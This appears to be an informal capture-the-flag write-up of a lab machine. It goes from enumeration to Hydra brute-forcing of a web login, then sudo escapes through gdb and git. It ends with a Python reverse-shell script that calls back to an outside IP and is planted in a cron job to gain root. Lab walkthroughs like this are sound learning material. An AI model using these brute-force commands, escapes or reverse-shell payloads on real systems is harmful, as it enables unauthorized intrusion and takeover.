# IP : 10.10.252.90
# Nmap Scan :
ftp 21 vsftpd
ssh 22
http 80  found robots.txt
/admin-dir
I told d4rckh we should hide our things deep.
So on hidden DIR we found user list & password list
use Hydra to do some bruteforce lets try

found nothing :( 
Lets try to find more hidden dir use gobuster
aothing only robots.txt
After that I again logined to ftp as I didn't find anything in other place & here we go one directory is available which we missed ...
after accessing we got yougotgoodeyes.txt file
and hell yeah one more directory /sUp3r-s3cr3t
let check it out
login form lets use hydra now 
hydra -L userid -P credentials.txt 10.10.252.90 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!"
We found correct user enox
let find correct password
hydra -l enox -P credentials.txt 10.10.252.90 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password"

[80][http-post-form] host: 10.10.252.90   login: enox   password: P@ssword1234
So We have our user name & password lets login
So we found page where we can insert data then lets inject our reverse shell :) 

So yeah we got access & user.txt available at d4rckh user 
let check for root & we can go to another user	thirtytwo which we can exploit using gdb 

 www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb
$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
at user thirtytwo one file is their which telling us about d4rckh can use git 
lets check for root user again & this time we got access for d4rckh using git exploit at gtfobin

(d4rckh) NOPASSWD: /usr/bin/git
sudo -u d4rckh /usr/bin/git -p help config
!/bin/sh

here at d4rckh one python file is available which is runnig cron job lets edit file with our shell 

# =*- coding: utf-8 -*-
#!/usr/bin/env python

import socket, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.90.144",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system("/bin/sh -i")

listen at local machine and after 2 min once revshell get execute we get the root access.
Go to root directory & access root flag .

Awesome We did it. 
Happy Hacking
